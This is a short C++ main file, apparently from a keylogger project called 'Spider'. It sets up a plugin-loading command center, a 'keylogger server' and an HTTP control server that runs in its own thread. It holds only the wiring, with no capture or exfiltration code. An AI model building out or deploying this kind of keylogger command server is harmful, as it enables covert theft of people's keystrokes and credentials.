#include <cstddef>
#include <thread>
#include "CommandCenter.h"
#include "SpiderServer.h"
#include "WebServer.h"

int main()
{
    int ret = EXIT_SUCCESS;

    // Create and initialize CommandCenter
    spider::server::CommandCenter cmdCenter("./plugins");

    // Create keylogger server
    spider::server::SpiderServer keyloggerServer(cmdCenter);

    // Create controllers here
    spider::http::WebServer httpServer(cmdCenter);

    // Add controllers to keylogger server
    keyloggerServer.addController(httpServer);

    // Run controllers
    std::thread httpServerThread{[&]() { httpServer.run(); }};

    // Run server
    keyloggerServer.run();

    // Stop controllers
    if (httpServerThread.joinable())
    {
        httpServerThread.join();
    }

    return ret;
}